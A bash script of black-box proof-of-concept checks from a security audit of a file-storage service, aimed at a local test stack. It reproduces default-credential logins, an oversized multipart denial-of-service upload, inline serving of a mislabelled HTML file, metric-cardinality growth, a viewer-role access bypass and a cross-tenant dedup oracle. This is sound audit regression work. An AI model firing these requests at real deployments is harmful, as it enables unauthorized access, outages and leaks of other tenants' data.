#!/usr/bin/env bash
# audit-repro/curl-poc.sh — black-box PoCs from the 2026-11-11 audit
# (commit e4cd5a6). FROZEN EVIDENCE.
#
# Run against a live stack:
#   cargo run --release -- --config config/default.yaml &
#   bash audit-repro/curl-poc.sh
#
# Sections assert the BUGGY behavior and print PASS-OF-BUG when the finding
# reproduces. After the remediation every section must report ATTACK-FAILED;
# the remediated CI runs `poc_expect_fail.sh` (the inverted smoke) instead.

set -u
BASE="${BASE:-http://127.0.0.1:8080}"
GRPC="${GRPC:-127.0.0.1:9090}"
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

say()  { printf '\n=== %s ===\n' "$*"; }
bug()  { printf '  PASS-OF-BUG: %s\n' "$*"; }
okay() { printf '  ATTACK-FAILED: %s\n' "$*"; }

# --- §C-01: shipped credentials --------------------------------------------
say "C-01 shipped credentials / known JWT secret / known api key"
CODE=$(curl -s -o "$TMP/login.json" -w '%{http_code}' -X POST "$BASE/api/v1/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}')
if [ "$CODE" = "200" ]; then
  bug "admin/admin123 logged in (HTTP $CODE)"
else
  okay "shipped credentials rejected (HTTP $CODE)"
fi
# internal api key on /internal
CODE=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/internal/chunk/$(printf 'a%.0s' {1..64})" \
  -H "X-Api-Key: internal-dev-api-key-change-me")
if [ "$CODE" != "401" ]; then
  bug "shipped api key accepted on /internal (HTTP $CODE)"
else
  okay "shipped api key rejected"
fi

# --- §H-02: multipart metadata buffering ------------------------------------
say "H-02 multipart metadata buffered before the 4 KiB check"
python3 - "$TMP/big.bin" <<'EOF'
import sys
with open(sys.argv[1], "wb") as f:
    f.write(b"\r\n".join([b"--pocboundary", b'Content-Disposition: form-data; name="tags"',
                          b"", b"x" * (256 * 1024 * 1024), b"--pocboundary--", b""]))
EOF
CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 60 -X POST "$BASE/api/v1/files" \
  -H "Authorization: Bearer $(curl -s -X POST "$BASE/api/v1/auth/login" -H 'Content-Type: application/json' \
      -d '{"username":"admin","password":"admin123"}' | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')" \
  -H 'Content-Type: multipart/form-data; boundary=pocboundary' \
  --data-binary @"$TMP/big.bin")
if [ "$CODE" = "201" ] || [ "$CODE" = "000" ]; then
  bug "oversize metadata accepted/hung the request (HTTP $CODE)"
else
  okay "oversize metadata rejected fast (HTTP $CODE)"
fi

# --- §H-03: dead validation / inline attacker MIME ---------------------------
say "H-03 PNG bytes stored and served as text/html"
TOKEN=$(curl -s -X POST "$BASE/api/v1/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}' | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
printf '\x89PNG\r\n\x1a\ncertainly not html' > "$TMP/fake.png"
FID=$(curl -s -X POST "$BASE/api/v1/files?name=fake.png&mime=text/html" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/octet-stream' \
  --data-binary @"$TMP/fake.png" | sed -n 's/.*"file_id":"\([^"]*\)".*/\1/p')
if [ -n "$FID" ]; then
  HEADERS=$(curl -s -D - -o /dev/null -H "Authorization: Bearer $TOKEN" "$BASE/api/v1/files/$FID")
  echo "$HEADERS" | grep -qi 'content-type: text/html' && \
    echo "$HEADERS" | grep -qi 'content-disposition: inline' && \
    ! echo "$HEADERS" | grep -qi 'nosniff' \
    && bug "attacker MIME served inline without nosniff (file $FID)" \
    || okay "serving headers are safe"
else
  okay "mime/content mismatch rejected at upload"
fi

# --- §H-05: metrics cardinality ----------------------------------------------
say "H-05 unbounded metric series from unmatched paths"
SERIES_BEFORE=$(curl -s "$BASE/metrics" | grep -c '^file_storage_http_requests_total' || true)
for i in $(seq 1 50); do curl -s -o /dev/null "$BASE/junk-path-$i-$RANDOM"; done
SERIES_AFTER=$(curl -s "$BASE/metrics" | grep -c '^file_storage_http_requests_total' || true)
if [ "$SERIES_AFTER" -gt "$((SERIES_BEFORE + 2))" ]; then
  bug "series grew $SERIES_BEFORE -> $SERIES_AFTER from 50 junk paths"
else
  okay "series stable ($SERIES_BEFORE -> $SERIES_AFTER)"
fi

# --- §M-04: cross-transport validation parity ---------------------------------
say "M-04 REST accepts what gRPC rejects (include_deleted for viewer)"
VTOKEN=$(curl -s -X POST "$BASE/api/v1/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"viewer","password":"viewer123"}' | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
CODE=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/api/v1/files?include_deleted=true&limit=1" \
  -H "Authorization: Bearer $VTOKEN")
if [ "$CODE" = "200" ]; then
  bug "viewer listed soft-deleted files over REST (HTTP $CODE)"
else
  okay "viewer denied include_deleted"
fi

# --- §M-16: cross-tenant content-existence oracle ------------------------------
say "M-16 plaintext-mode dedup oracle"
SECRET="tenant-a-secret-document-bytes-0123456789"
A=$(curl -s -X POST "$BASE/api/v1/files?name=doc-a.bin&mime=application/octet-stream" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/octet-stream' \
  --data-binary "$SECRET")
ALICE=$(curl -s -X POST "$BASE/api/v1/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
B=$(curl -s -X POST "$BASE/api/v1/files?name=doc-b.bin&mime=application/octet-stream" \
  -H "Authorization: Bearer $ALICE" -H 'Content-Type: application/octet-stream' \
  --data-binary "$SECRET")
DEDUP_A=$(echo "$A" | sed -n 's/.*"dedup_chunks":\([0-9]*\).*/\1/p')
DEDUP_B=$(echo "$B" | sed -n 's/.*"dedup_chunks":\([0-9]*\).*/\1/p')
if [ "${DEDUP_B:-0}" != "0" ]; then
  bug "tenant B dedup-hit tenant A's content (dedup_chunks=$DEDUP_B) — existence oracle"
else
  okay "no cross-tenant dedup hit (tenant-scoped keys)"
fi

say "done — PASS-OF-BUG lines above are the audit's black-box evidence"
